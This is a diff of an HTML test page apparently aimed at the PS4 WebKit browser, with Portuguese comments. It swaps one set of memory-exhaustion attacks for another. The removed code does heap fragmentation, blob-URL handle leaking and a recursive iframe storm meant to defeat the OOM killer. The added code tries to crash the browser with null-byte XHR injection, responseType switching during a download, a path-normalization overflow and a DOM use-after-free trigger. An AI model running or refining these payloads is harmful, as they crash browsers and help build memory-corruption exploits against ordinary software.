@@ -2,26 +2,27 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 Memory Fragmentation</title>
+    <title>PS4 Logic Validation Fuzzer</title>
     <style>
         body { background-color: #000; color: #fff; font-family: monospace; padding: 20px; }
         button { 
-            background: #fff; color: #000; border: 1px solid #aaa; 
-            padding: 20px; width: 100%; margin-bottom: 15px; 
-            font-size: 18px; font-weight: bold; cursor: pointer; 
+            background: #fff; color: #000; border: none; 
+            padding: 15px; width: 100%; margin-bottom: 10px; 
+            font-size: 16px; font-weight: bold; cursor: pointer; text-align: left;
         }
-        button:hover { background: #ddd; }
-        #log { border: 1px solid #fff; padding: 10px; margin-top: 20px; height: 200px; overflow: auto; }
+        button:hover { background: #ccc; }
+        #log { border-top: 1px solid #fff; padding-top: 10px; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-    <h1>HEAP FRAGMENTATION SUITE</h1>
-    <p>Target: Bypass OOM Killer via Allocator Stress</p>
+    <h1>INPUT VALIDATION ATTACKS</h1>
+    <p>Target: C++ Parser Logic (Null Bytes, State Machine, URL Norm)</p>
 
-    <button onclick="runSwissCheese()">TEST 1: Swiss Cheese (Fragmentation)</button>
-    <button onclick="runHandleLeak()">TEST 2: Kernel Handle Leak (Blob URLs)</button>
-    <button onclick="runIframeStorm()">TEST 3: Iframe Recursion (Process Limit)</button>
+    <button onclick="runNullByteXHR()">TEST 1: XHR Null Byte Injection (Method/URL)</button>
+    <button onclick="runTypeConfusion()">TEST 2: XHR ResponseType Switching (Race)</button>
+    <button onclick="runURLNormalization()">TEST 3: URL Path Normalization Overflow</button>
+    <button onclick="runDoubleFree()">TEST 4: Event Listener Double Detach</button>
 
     <div id="log">Status: Aguardando...</div>
 
@@ -30,88 +31,98 @@
             document.getElementById('log').innerText = `> ${msg}\n` + document.getElementById('log').innerText;
         }
 
-        // VETOR 1: Fragmentação "Queijo Suíço"
-        // Tenta confundir o gerenciador de memória (bmalloc)
-        function runSwissCheese() {
-            log("Iniciando fragmentação...");
+        // TESTE 1: Injeção de Null Byte (\u0000)
+        // O JS suporta \0, mas o C++ acha que é o fim da string.
+        // Se o WebKit não validar isso na ponte JS->C++, pode haver leitura inválida.
+        function runNullByteXHR() {
+            log("Enviando Null Bytes para o NetworkProcess...");
+            try {
+                const xhr = new XMLHttpRequest();
+                // Tenta injetar null byte no método HTTP
+                // Esperado: Erro de sintaxe. Crash se a validação falhar.
+                const methods = ["GET\u0000", "POST\u0000", "GET\u0000POST"];
+                
+                methods.forEach(m => {
+                    try {
+                        xhr.open(m, "/");
+                        xhr.send();
+                    } catch(e) { /* Ignora erros tratados */ }
+                });
+
+                // Tenta injetar no cabeçalho
+                xhr.open("GET", "/");
+                xhr.setRequestHeader("X-Test", "A".repeat(100) + "\u0000" + "B".repeat(100));
+                xhr.send();
+                
+                log("Sobreviveu ao Null Byte.");
+            } catch(e) { log("Erro JS: " + e.message); }
+        }
+
+        // TESTE 2: XHR Type Confusion
+        // Tenta mudar o formato de armazenamento dos dados (JSON -> Blob -> ArrayBuffer)
+        // ENQUANTO os dados estão chegando. Confunde o ponteiro de memória.
+        function runTypeConfusion() {
+            log("Iniciando XHR Type Switching...");
+            const xhr = new XMLHttpRequest();
+            xhr.open("GET", document.location.href + "?" + Math.random()); // Baixa a própria página
+            
+            xhr.onreadystatechange = function() {
+                try {
+                    // Estado 3 = LOADING (Recebendo dados)
+                    if (xhr.readyState === 3) {
+                        // O C++ está escrevendo na memória. Vamos mudar o tipo do buffer.
+                        xhr.responseType = "arraybuffer";
+                        xhr.responseType = "text";
+                        xhr.responseType = "blob";
+                    }
+                } catch(e) {}
+            };
+            
+            xhr.send();
+            log("Requisição enviada. Monitorando...");
+        }
+
+        // TESTE 3: URL Path Normalization
+        // Caminhos com muitos pontos (..) forçam o parser a calcular o diretório pai.
+        // Um buffer overflow pode ocorrer se o caminho resultante for negativo ou gigante.
+        function runURLNormalization() {
+            log("Gerando URL Malformada...");
             setTimeout(() => {
                 try {
-                    const holes = [];
-                    const count = 50000;
+                    // Cria: /a/../a/../a/../ repetido 50.000 vezes
+                    const part = "/a/..";
+                    const evilPath = part.repeat(50000);
                     
-                    // Fase 1: Alocação Contígua
-                    log("Alocando blocos...");
-                    for(let i=0; i<count; i++) {
-                        // ArrayBuffer de 4KB (tamanho de página comum)
-                        holes.push(new ArrayBuffer(4096));
-                    }
-
-                    // Fase 2: Criar Buracos (Deletar alternados)
-                    log("Criando buracos na memória...");
-                    for(let i=0; i<count; i+=2) {
-                        holes[i] = null; // Libera memória
-                    }
-
-                    // Fase 3: Preencher com tamanho incompatível
-                    // Tenta colocar 6KB onde cabiam 4KB
-                    log("Forçando realocação incompatível...");
-                    const fillers = [];
-                    for(let i=0; i<count/2; i++) {
-                        fillers.push(new ArrayBuffer(6144)); 
-                    }
+                    // Tenta forçar o navegador a resolver esse caminho na barra de endereço
+                    history.pushState({}, "", evilPath);
                     
-                    log("Ciclo concluído. Verifique instabilidade.");
+                    log("URL inserida no History (Sem Crash).");
                 } catch(e) { log("Erro: " + e.message); }
             }, 100);
         }
 
-        // VETOR 2: Esgotamento de Handles (Kernel)
-        // A RAM pode estar livre, mas o Kernel tem um limite de "referências"
-        function runHandleLeak() {
-            log("Iniciando vazamento de Handles (Blob URLs)...");
-            let count = 0;
-            const content = new Blob(["PS4_KERNEL_STRESS_TEST"], {type: 'text/plain'});
-            
-            const interval = setInterval(() => {
-                try {
-                    // Cria URLs mas NUNCA as revoga (revokeObjectURL)
-                    // O navegador precisa manter uma tabela de tradução para cada um
-                    for(let i=0; i<100; i++) {
-                        URL.createObjectURL(content);
-                        count++;
-                    }
-                    if(count % 1000 === 0) log(`Handles criados: ${count}`);
-                    
-                    if(count > 200000) {
-                        clearInterval(interval);
-                        log("Limite atingido. O navegador deve começar a falhar agora.");
-                    }
-                } catch(e) {
-                    log("Falha na criação de Handle: " + e.message);
-                    clearInterval(interval);
-                }
-            }, 10);
-        }
+        // TESTE 4: Event Listener Double Detach (DOM Logic)
+        // Tenta remover um nó DOM dentro do evento que ele mesmo disparou.
+        // Clássico Use-After-Free lógico.
+        function runDoubleFree() {
+            log("Executando DOM Detach...");
+            const div = document.createElement('div');
+            const child = document.createElement('span');
+            div.appendChild(child);
+            document.body.appendChild(div);
 
-        // VETOR 3: Iframe Storm
-        // Cada Iframe pode exigir um novo contexto de segurança
-        function runIframeStorm() {
-            log("Iniciando Iframe Storm...");
-            document.body.innerHTML = ""; // Limpa a tela
-            
-            function addFrame() {
-                const ifr = document.createElement('iframe');
-                // Carrega uma página vazia para ser rápido
-                ifr.src = "about:blank"; 
-                ifr.style.width = "10px";
-                ifr.style.height = "10px";
-                document.body.appendChild(ifr);
-                
-                // Recursão rápida
-                setTimeout(addFrame, 5); 
-                setTimeout(addFrame, 5); 
-            }
-            addFrame();
+            child.addEventListener('DOMNodeRemoved', function() {
+                // O nó está sendo removido. Vamos tentar acessar o pai
+                // e forçar uma operação de layout nele.
+                try {
+                    div.innerHTML = ""; // Destrói o pai enquanto o filho morre
+                    const crash = child.offsetWidth; // Acessa propriedade do filho morto
+                } catch(e) {}
+            });
+
+            // Dispara o evento
+            div.removeChild(child);
+            log("DOM Detach finalizado.");
         }
 
     </script>
